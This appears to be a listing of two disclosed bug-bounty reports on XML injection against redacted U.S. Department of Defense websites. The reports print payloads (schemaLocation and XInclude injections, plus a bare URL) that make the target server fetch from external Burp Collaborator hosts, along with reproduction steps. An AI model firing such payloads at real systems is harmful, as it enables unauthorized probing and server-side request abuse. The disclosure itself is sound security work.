# XML Injection

_2 reports — High/Critical, disclosed_

### [XML Injection / External Service Interaction (HTTP/DNS) On https://█████████.mil](https://hackerone.com/reports/1150799)

- **Report ID:** `1150799`
- **Severity:** High
- **Weakness:** XML Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fiveguyslover
- **Bounty:** - usd
- **Disclosed:** 2021-06-15T19:30:12.935Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings, I found on one of your sites an XML Injection + External service Interaction (DNS/HTTP)
Link of the vulnerable file : https://█████.mil/██████████
Payload XML Injection : 
```
<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
```
(please change the link of burp collaborator and + URL encode the payload)

#How to reproduce

█████
(I cut the video because the reception time is 30-40 seconds, it is not very relevant)

here is another payload that works, without XML : 

```
http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg
```
(please change the link of burp collaborator)
it is also necessary to wait a little, possibly one minute.

all the ips I receive are from ███.

if you need help, don't hesitate.
fiveguyslover.

## Impact

XML Injection + We can use the weakness as a attack proxy to DDOS all Internal/external web conatiners, also could be amplified too

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Link of the vulnerable file : https://██████.mil/█████████

Payload XML Injection : 
```
<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
```
(please change the link of burp collaborator and + URL encode the payload)

here is another payload that works, without XML : 

```
http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg
```

POC Attached

## Suggested Mitigation/Remediation Actions

---

### [XML Injection on https://www.█████████ (███ parameter)](https://hackerone.com/reports/997381)

- **Report ID:** `997381`
- **Severity:** High
- **Weakness:** XML Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fiveguyslover
- **Bounty:** - usd
- **Disclosed:** 2021-04-02T18:43:46.824Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings,

I found an XML injection on https://www.███.
This kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response
here is the complete link: https://www.███/███████
Payload : 

`███████=<vuc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo"/></vuc>`

Result : 

███

best regards, 
frenchvlad

## Impact

gaining the access to the unauthorized parts and stealing the sensitive data would be the most important thing to know when it comes to XML’s impact.

---
